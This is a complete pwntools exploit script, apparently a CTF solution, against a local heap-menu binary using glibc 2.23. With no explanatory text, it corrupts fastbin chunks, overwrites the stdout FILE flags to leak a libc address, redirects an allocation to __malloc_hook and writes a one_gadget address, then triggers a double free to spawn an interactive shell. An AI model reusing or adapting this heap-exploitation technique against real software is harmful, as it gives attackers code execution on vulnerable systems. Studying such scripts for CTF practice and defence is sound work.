from pwn import*
def add(size,idx):
	p.sendlineafter('Free',"1")
	p.sendlineafter('Enter size of chunk :',str(size))
	p.sendlineafter('Enter index :',str(idx))

def free(idx):
	p.sendlineafter('Free',"3")
	p.sendlineafter('Enter index :',str(idx))

def edit(idx,data):
	p.sendlineafter('Free',"2")
	p.sendlineafter('Enter index of chunk :',str(idx))
	p.sendafter('Enter data :',data)

p = process('./main')
libc = ELF('./libc-2.23.so',checksec=False)
#context.log_level ='DEBUG'
p.sendlineafter('Enter name :','FMYY')
add(0x18,0)
add(0xC8,1)
add(0x68,2)
edit(1,'\x00'*0x68 + p64(0x61))
free(1)
add(0xC8,1)
add(0x68,3)
add(0x68,4)
add(0x68,5)
edit(0,'\x00'*0x18 + '\x71')
free(2)
free(3)
edit(3,'\x20')
edit(1,'\xDD\x25')
add(0x68,9)
add(0x68,9)
payload = '\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88'
add(0x68,9)
edit(9,payload)
libc_base = u64(p.recvuntil('\x7F').ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
libc.address = libc_base
free(4)
edit(4,p64(0))
add(0x68,0)
free(0)
edit(0,p64(libc.sym['__malloc_hook'] - 0x23))
add(0x68,0)
add(0x68,0)
p.sendlineafter('Free',"2")
p.sendlineafter('Enter index of chunk :','0')
p.send('\x00'*0x13+p64(libc_base + 0xF02A4))
free(1)
free(1)
p.interactive()
